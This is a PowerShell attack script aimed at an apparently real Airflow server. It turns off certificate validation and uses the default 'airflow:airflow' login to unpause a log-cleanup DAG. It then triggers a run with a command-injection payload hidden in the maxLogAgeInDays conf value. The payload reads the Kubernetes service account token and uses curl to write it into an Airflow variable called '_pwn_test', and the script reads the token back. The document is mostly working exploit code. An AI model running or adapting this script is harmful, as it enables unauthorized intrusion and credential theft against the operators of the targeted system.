Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"; $req.Headers.Add("Authorization", "Basic $encoded"); $req.Accept = "application/json"
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

# Step 1: Unpause maintenance_logs_cleanup
Write-Host "=== UNPAUSE maintenance_logs_cleanup ==="
Write-Host (AF-Patch "/api/v1/dags/maintenance_logs_cleanup" '{"is_paused":false}')

# Step 2: Get DAG info to verify
Write-Host "`n=== DAG INFO ==="
$dagInfo = AF-Get "/api/v1/dags/maintenance_logs_cleanup"
Write-Host $dagInfo

# Step 3: Check lock file - need to trigger in way that bypasses lock
# Lock file: /tmp/airflow_log_cleanup_worker.lock
# If it exists, script exits 0 (skips)
# Solution: inject command BEFORE the lock check

# The bash template is:
# MAX_LOG_AGE_IN_DAYS="{{dag_run.conf.maxLogAgeInDays}}"
# So injecting: 30"; CMD; echo "
# Makes it: MAX_LOG_AGE_IN_DAYS="30"; CMD; echo ""

# The injection runs BEFORE the lock file check!

# Step 4: Trigger with command injection
# Inject: read K8s SA token and save to Airflow variable
$injectCmd = '30`"; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); HOSTNAME=$(hostname); curl -sk -X PATCH https://dev-airflow.kbfinansia.com/api/v1/variables/_pwn_test -H "Authorization: Basic YWlyZmxvdzphaXJmbG93" -H "Content-Type: application/json" -d "{\"key\":\"_pwn_test\",\"value\":\"$TOKEN\"}" ; echo "`'

# Build trigger JSON with the injection
$ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")

# Use a file-based approach to avoid escaping issues
$triggerPayload = @{
    conf = @{
        maxLogAgeInDays = '30"; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo NO_TOKEN); curl -sk -X PATCH https://dev-airflow.kbfinansia.com/api/v1/variables/_pwn_test -H "Authorization: Basic YWlyZmxvdzphaXJmbG93" -H "Content-Type: application/json" -d "{\"key\":\"_pwn_test\",\"value\":\"$TOKEN\"}"; echo "'
    }
    logical_date = $ts
} | ConvertTo-Json -Depth 10

Write-Host "`n=== TRIGGER with injection ==="
Write-Host "Payload: $triggerPayload"
Write-Host (AF-Post "/api/v1/dags/maintenance_logs_cleanup/dagRuns" $triggerPayload)

# Step 5: Wait and check _pwn_test variable
Write-Host "`n=== Waiting 15 seconds for DAG run ==="
Start-Sleep 15

Write-Host "`n=== CHECK _pwn_test variable ==="
Write-Host (AF-Get "/api/v1/variables/_pwn_test")

# Step 6: Also check recent dag runs
Write-Host "`n=== RECENT RUNS ==="
Write-Host (AF-Get "/api/v1/dags/maintenance_logs_cleanup/dagRuns?limit=5&order_by=-start_date")
